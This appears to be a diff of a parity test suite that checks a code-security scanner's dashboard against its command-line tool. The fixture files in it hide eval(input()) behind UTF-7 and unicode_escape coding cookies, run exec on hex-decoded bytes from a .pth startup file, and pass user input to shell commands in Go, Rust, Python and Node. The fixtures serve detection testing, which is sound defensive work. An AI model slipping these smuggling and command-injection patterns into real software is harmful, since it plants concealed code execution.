+    ("utf-7 cookie", [("u7.py", b"# coding: utf-7\nx = 1  # +AAo-eval(input())\n")]),
+    ("escape cookie", [("esc.py", b"# -*- coding: unicode_escape -*-\nx = 1  # \\u000aeval(input())\n")]),
+    ("latin-1 cookie", [("l1.py", cookie("latin-1", "s = 'caf\xe9'\neval(s)\n"))]),
+    ("euc_jis_2004 cookie", [("j.py", cookie("euc_jis_2004", "# \u6f22\u5b57\nx = eval(y)\n"))]),
+    ("an undecoded codec", [("i.py", b"# coding: idna\nx = eval(y)\n")]),
+    ("crlf", [("crlf.py", b"import os\r\nos.system(input())\r\n"), ("crlf.js", b"eval(a)\r\nx = 1\r\n")]),
+    (".pth", [("hook.pth", b"import sys\nimport os; exec(bytes.fromhex('7072696e74283129').decode())\n"
+                           b"/opt/lib\n")]),
+    (".pyw", [("tool.pyw", "import os\nos.system(user_cmd)\n")]),
+    ("go and rust", [("main.go", 'package main\n\nimport "os/exec"\n\nfunc run(c string) {\n'
+                                 '\texec.Command("sh", "-c", c).Run()\n}\n'),
+                     ("src/lib.rs", 'use std::process::Command;\n\npub fn run(c: &str) {\n'
+                                    '    Command::new("sh").arg("-c").arg(c).status().unwrap();\n}\n')]),
+    ("scripts without an extension", [("tool", "#!/usr/bin/env python3\nimport os\nos.system(input())\n"),
+                                      ("cli", "#!/usr/bin/env node\nrequire('child_process').exec(process.argv[2]);\n"),
+                                      ("notes", "just some notes\n")]),
+    ("binaries", [("lib.py", b"\x7fELF\x02\x01\x01" + bytes(200)), ("logo.png", b"\x89PNG\r\n\x1a\n" + bytes(64)),
+                  ("clip.ts", b"".join([b"\x47" + bytes(187)] * 4)), ("._x.py", b"\x00\x05\x16\x07" + bytes(60))]),
+    ("a config file", [("config.yaml", f"aws_secret_access_key: {SECRET}\nregion: us-east-1\n"),
+                       ("app.py", "import yaml\ncfg = yaml.safe_load(open('config.yaml'))\n")]),
+    ("manifests", [("package.json", '{"name": "x", "version": "1.0.0", "scripts": {"test": "node t.js"}}\n'),
+                   ("binding.gyp", "{'targets': [{'target_name': 'x', 'sources': ['x.cc']}]}\n")]),
+    ("empty and named", [("empty.py", b""), ("caf\u00e9.py", "eval(x)\n")]),
 ]
-
-
-def issue_key(issue):
-    return json.dumps(issue, sort_keys=True, ensure_ascii=False)
-
-
-def short(issue):
-    rest = {k: v for k, v in issue.items() if k not in ("rule", "line", "file")}
-    return f"{issue['rule']}@{issue['line']} {json.dumps(rest, sort_keys=True, ensure_ascii=False)[:300]}"
-
-
-# What the page reads otherwise than the CLI, by design: (file, rule, line)
-# of each finding only the CLI has. The engine's lexers read a template's
-# `${…}` and an f-string's fields as code (a call there runs:
-# docs/RUST_ENGINE.md §15); the page keeps its own comment lexer, which
-# reads them as text, until it runs the engine itself.
-ONLY_IN_THE_CLI = {
-    ("lookalike_strings.js", "SC-HOMOGLYPH", 3),
-    ("lookalike_strings.py", "SC-HOMOGLYPH", 7),
-}
-
-
-# SECRET-FP (0.1.9) changed the engine's secret tests, not the page's: a token that says it is a sample, a value that
-# is a name, an entropy literal that is a name, a sequence, an address or an encoded document is no longer reported.
-# The page keeps its own scanner until it runs the engine's (BR-7 step 5, which removes this list with the page's
-# copy; John, Oct 15: "stop making dual copies that we are going to make go away"). In these files the page reports
-# secret findings the CLI does not, and redacts those values in other findings' snippets; the CLI's secret findings
-# must be the page's, and every other finding must agree but for its snippet.
-SECRET_FP_PAGE_ONLY = {"b64_plain.js", "tokens.js", "detection_gaps/encoding_readme.py", "testproj/secrets.py"}
-SECRET_FP_RULES = {"S-SECRET", "S-TOKEN", "S-ENTROPY"}
-
-
-def page_only_secrets(name, cli, page):
-    """The page's secret findings in a SECRET_FP_PAGE_ONLY file that the CLI does not report (rule and line)."""
-    if name not in SECRET_FP_PAGE_ONLY:
-        return []
-    have = collections.Counter((i["rule"], i["line"]) for i in cli if i["rule"] in SECRET_FP_RULES)
-    out = []
-    for i in page:
-        key = (i["rule"], i["line"])
-        if i["rule"] in SECRET_FP_RULES:
-            if have[key] > 0:
-                have[key] -= 1
-            else:
-                out.append(i)
-    return out
-
-
-def cli_upload(name, data):
-    """What the CLI reports for a source file with these bytes."""
-    lang = core.EXTS[os.path.splitext(name)[1].lower()]
-    text, info = core.decode_source(data, lang)
-    return core.encoding_issues(name, text, info) + core.scan_file(name, text, lang)
 
 
 @dash.requires_node
-class DashboardParityTests(unittest.TestCase):
-    def assert_same_findings(self, name, cli, page):
-        expected = [i for i in cli if (name, i["rule"], i["line"]) in ONLY_IN_THE_CLI]
-        self.assertEqual(len(expected), sum(1 for f, _r, _l in ONLY_IN_THE_CLI if f == name), name)
-        cli = [i for i in cli if (name, i["rule"], i["line"]) not in ONLY_IN_THE_CLI]
-        if name in SECRET_FP_PAGE_ONLY:
-            extra = page_only_secrets(name, cli, page)
-            page = [i for i in page if not any(i is x for x in extra)]
-            blank = lambda i: {k: v for k, v in i.items() if k not in ("snippet", "snipStart")}
-            cli, page = list(map(blank, cli)), list(map(blank, page))
-        a, b = collections.Counter(map(issue_key, cli)), collections.Counter(map(issue_key, page))
-        if a == b:
-            return
-        only_cli = [json.loads(k) for k in (a - b).elements()]
-        only_page = [json.loads(k) for k in (b - a).elements()]
-        self.fail(f"{name}: findings differ\n  only in the CLI:\n    "
-                  + "\n    ".join(map(short, only_cli[:8])) + "\n  only in the dashboard:\n    "
-                  + "\n    ".join(map(short, only_page[:8])))
+class ParityTests(unittest.TestCase):
+    @classmethod
+    def setUpClass(cls):
+        cls.projects = fixture_projects() + UPLOADS
+        # the samples, as the page shows them: each button's text, then each scanned as pasted
+        got = dash.run([r for button in ("samplePy", "sampleJs", "sampleSql")
+                        for r in ({"op": "click", "id": button}, {"op": "html", "id": "code"},
+                                  {"op": "html", "id": "lang"})])
+        cls.samples = [(got[k + 1]["value"], got[k + 2]["value"]) for k in range(0, len(got), 3)]
+        cls.pages = dash.run([dash.scan_request(files) for _, files in cls.projects]
+                             + [dash.scan_request(paste=text, lang=lang) for text, lang in cls.samples], timeout=40)
 
-    def compare(self, cases, html=dash.HTML):
-        """cases: [(name, lang, content)]; one page instance for all of them."""
-        page = dash.run([{"op": "scanFile", "file": {"name": n, "lang": lang, "content": c}}
-                         for n, lang, c in cases], html=html)
-        for (name, lang, content), page_issues in zip(cases, page):
-            with self.subTest(file=name):
-                self.assert_same_findings(name, core.scan_file(name, content, lang), page_issues)
-        return page
+    def same(self, page, cli, files):
+        self.assertNotIn("error", page, page.get("error"))
+        self.assertEqual(page["generatedBy"], "lazaret-dashboard-2")
+        self.assertEqual(page["files"], sorted(rel for rel, _ in files))
+        self.assertEqual(cli.get("warnings", []), [])
+        page, cli = dash.comparable(page, dash.PAGE_ONLY), dash.comparable(cli, dash.CLI_ONLY)
+        self.assertEqual(sorted(page), sorted(cli))
+        for key in page:
+            if key != "issues":
+                self.assertEqual(page[key], cli[key], key)
+        self.assertEqual(len(page["issues"]), len(cli["issues"]))
+        for mine, theirs in zip(page["issues"], cli["issues"]):
+            self.assertEqual(mine, theirs)
 
-    def test_fixtures(self):
-        files = fixture_files()
-        self.assertGreater(len(files), 30)
-        self.compare([(rel, LANGS[os.path.splitext(rel)[1]], read_fixture(rel)) for rel in files])
+    def test_fixtures_and_uploads(self):
+        self.assertGreater(len(self.projects), 20)
+        for (name, files), page in zip(self.projects, self.pages):
+            with self.subTest(name):
+                self.same(page, dash.cli_result(files), files)
 
-    def test_dashboard_samples(self):
-        sources = dash.run([{"op": "eval", "expr": const} for const, _, _ in SAMPLES])
-        page = self.compare([(name, lang, src) for (_, name, lang), src in zip(SAMPLES, sources)])
-        self.assertTrue(all(len(issues) >= 10 for issues in page))
+    def test_some_findings_are_compared(self):
+        """The inputs reach the collection's paths: decoded, classified, the .pth check, Go and Rust, a config
+        file's credential, the cross-file pass."""
+        rules = {i["rule"] for page in self.pages for i in page.get("issues", [])}
+        for rule in ("Q-ENCODING", "SC-UTF7", "SC-ESCAPE-CODEC", "SC-TRUNCATED", "SC-PTH-EXEC", "S-OSCMD-PY",
+                     "S-EVAL-PY", "SC-INSTALL-HOOK", "SC-BINARY", "S-SECRET"):
+            with self.subTest(rule):
+                self.assertIn(rule, rules)
+        self.assertTrue(any(page.get("crossFile") for page in self.pages))
+        go_rust = self.pages[[n for n, _ in self.projects].index("go and rust")]
+        self.assertEqual(go_rust["metrics"]["files"], 2)                    # both read as source (N-14)
+        config = self.pages[[n for n, _ in self.projects].index("a config file")]
+        self.assertEqual(config["metrics"]["configFiles"], 1)
 
-    def test_taint_cases(self):
-        """Every case of test_taint_fstrings (f-strings and template literals,
-        joined statements, Flask views, sink arguments, guards, scopes)."""
-        from tests.scanner.test_taint_fstrings import QUIET, REPORTED
-        cases = [(f"r{n:02d}.{lang}", lang, src) for n, (lang, src, _) in enumerate(REPORTED)]
-        cases += [(f"q{n:02d}.{lang}", lang, src) for n, (lang, src) in enumerate(QUIET)]
-        page = self.compare(cases)
-        self.assertEqual({i["rule"] for issues in page for i in issues if i["rule"].startswith("T-")},
-                         {"T-CMD", "T-PATH", "T-XSS", "T-REDIR", "T-SQL", "T-SSRF"})
-
-    def test_framework_cases(self):
-        """Every case of test_taint_frameworks (route parameters, framework
-        sinks and sanitizers, containers, allowlist guards)."""
-        from tests.scanner.test_taint_frameworks import QUIET, REPORTED
-        cases = [(f"fr{n:02d}.{lang}", lang, src) for n, (lang, src, _) in enumerate(REPORTED)]
-        cases += [(f"fq{n:02d}.{lang}", lang, src) for n, (lang, src) in enumerate(QUIET)]
-        page = self.compare(cases)
-        self.assertEqual({i["rule"] for issues in page for i in issues if i["rule"].startswith("T-")},
-                         {"T-CMD", "T-PATH", "T-XSS", "T-REDIR", "T-SQL", "T-SSTI", "T-CODE"})
-
-    def test_owasp_cases(self):
-        """Every case of test_taint_owasp (Q-2 and Q-3: the session, LDAP and XPath sinks, for targets, escaped
-        quotes, set() and get(); cookies, weak randomness, external entities)."""
-        from tests.scanner import test_taint_owasp as owasp
-        cases = [(f"or{n:02d}.{lang}", lang, src) for n, (lang, src, _) in enumerate(owasp.REPORTED)]
-        cases += [(f"oq{n:02d}.{lang}", lang, src) for n, (lang, src) in enumerate(owasp.QUIET)]
-        cases += [("ow-cookie.py", "py", owasp.COOKIES), ("ow-random.py", "py", owasp.RANDOMS),
-                  ("ow-xml.py", "py", owasp.XMLS)]
-        page = self.compare(cases)
-        rules = {i["rule"] for issues in page for i in issues}
-        self.assertTrue({"T-TRUST", "T-LDAP", "T-XPATH", "T-CMD", "T-CODE", "S-COOKIE", "S-WEAKRAND", "S-RANDOM",
-                         "S-XML"} <= rules, rules)
-
-    def test_adversarial_inputs(self):
-        page = self.compare(ADVERSARIAL)
-        # not vacuous: the inputs exercise most of the rule set
-        self.assertGreater(len({i["rule"] for issues in page for i in issues}), 70)
-
-    def test_uploads(self):
-        (page,) = dash.run([{"op": "uploadScan", "files": [
-            {"name": n, "b64": base64.b64encode(data).decode("ascii")} for n, data in UPLOADS]}])
-        self.assertEqual(len(page), len(UPLOADS))
-        for (name, data), page_issues in zip(UPLOADS, page):
-            with self.subTest(file=name):
-                self.assert_same_findings(name, cli_upload(name, data), page_issues)
-
-    def test_undecodable_codec_is_still_reported(self):
-        data = b"# coding: cp037\neval(x)\n"
-        (page,) = dash.run([{"op": "uploadScan", "files": [{"name": "ebcdic.py", "b64": base64.b64encode(data).decode()}]}])
-        text, info = core.decode_source(data, "py")
-        self.assertEqual(info["encoding"], "cp037")
-        (cli_note,) = core.encoding_issues("ebcdic.py", text, info)
-        (page_note,) = [i for i in page[0] if i["rule"] == "Q-ENCODING"]
-        self.assertEqual(page_note["msg"], cli_note["msg"])     # "... (detected cp037) ..."
-
-    def test_report_matches_build_result(self):
-        sets = {
-            "mixed": ["testproj/app.py", "testproj/secrets.py", "testproj/utils/web.js", "sqlproj/schema.sql"],
-            "clean": ["cleanproj/clean.py", "sqlclean/clean.sql"],
-        }
-        dup = "".join(f"v{i} = compute({i})\n" for i in range(8))
-        for label, rels in sets.items():
-            files = [(rel, LANGS[os.path.splitext(rel)[1]], read_fixture(rel)) for rel in rels]
-            if label == "clean":
-                files += [("dup/a.py", "py", dup), ("dup/b.py", "py", dup)]
-            with self.subTest(set=label):
-                (page,) = dash.run([{"op": "runScan", "files": [
-                    {"name": n, "lang": lang, "content": c} for n, lang, c in files]}])
-                issues = []
-                for n, lang, c in files:
-                    issues += core.scan_file(n, c, lang)
-                cli = core.build_result(".", [{"path": n, "lang": lang, "content": c} for n, lang, c in files], issues)
-                extra = [x for n, _l, _c in files for x in page_only_secrets(n, [i for i in cli["issues"] if i["file"] == n],
-                                                                          [i for i in page["issues"] if i["file"] == n])]
-                counts = collections.Counter(page["counts"])
-                counts.subtract(collections.Counter(i["type"] for i in extra))
-                self.assertEqual(dict(counts), cli["counts"], "counts")
-                for key in ("metrics", "ratings", "supplyChain", "pass"):
-                    self.assertEqual(page[key], cli[key], key)
-                # the CLI's last condition is its cross-file flow engine, which the page doesn't have
-                self.assertEqual(cli["conditions"][-1], {"label": "No cross-file taint flows", "ok": True})
-                self.assertEqual(page["conds"], cli["conditions"][:-1])
-                page_issues = [i for i in page["issues"] if not any(i is x for x in extra)]
-                self.assert_same_findings(label, cli["issues"], page_issues)
-                self.assertEqual([(i["sev"], i["file"], i["line"]) for i in page_issues],
-                                 [(i["sev"], i["file"], i["line"]) for i in cli["issues"]])
-        self.assertGreater(page["metrics"]["dupPct"], 0)
+    def test_the_samples(self):
+        self.assertEqual([lang for _, lang in self.samples], ["py", "js", "sql"])
+        pages = self.pages[len(self.projects):]
+        for (text, lang), page in zip(self.samples, pages):
+            with self.subTest(lang):
+                files = [(f"pasted-code.{lang}", text)]
+                self.same(page, dash.cli_result(files), files)
+                self.assertFalse(page["pass"])
 
     def test_the_comparison_can_fail(self):
-        """Control: a page that drops a rule, or words a finding differently, is caught."""
-        with open(dash.HTML, encoding="utf-8", newline="") as f:
-            html = f.read()
-        src = "import pickle\npickle.loads(d)\n"
-        cli = core.scan_file("sample.py", src, "py")
-        for old, new in (('id:"S-PICKLE"', 'id:"S-PICKLE-OFF"'),
-                         ('msg:"pickle.load(s) executes code', 'msg:"pickle.load(s) runs code')):
-            with self.subTest(change=new):
-                broken = html.replace(old, new, 1)
-                self.assertNotEqual(broken, html)
+        """Control: a page that counts the config files wrongly, or drops a finding, is caught."""
+        with open(dash.HTML, encoding="utf-8") as f:
+            page = f.read()
+        files = dict(UPLOADS)["a config file"]
+        broken = [page.replace("res.metrics.configFiles = col.configs.length;",
+                               "res.metrics.configFiles = col.configs.length + 1;"),
+                  page.replace("const res = redactResult(gradeResult(col.files, collectionIssues(col)));",
+                               "const res = redactResult(gradeResult(col.files, collectionIssues(col).slice(1)));")]
+        for k, html in enumerate(broken):
+            with self.subTest(k):
+                self.assertNotEqual(html, page)
                 with tempfile.TemporaryDirectory() as d:
                     path = os.path.join(d, "lazaret.html")
-                    with open(path, "w", encoding="utf-8", newline="") as f:
-                        f.write(broken)
-                    (page,) = dash.run([{"op": "scanFile", "file": {"name": "sample.py", "lang": "py", "content": src}}],
-                                       html=path)
-                self.assertNotEqual(collections.Counter(map(issue_key, page)), collections.Counter(map(issue_key, cli)))
+                    with open(path, "w", encoding="utf-8") as f:
+                        f.write(html)
+                    got = dash.scan(files, html=path)
+                with self.assertRaises(AssertionError):
+                    self.same(got, dash.cli_result(files), files)
 
 
 if __name__ == "__main__":
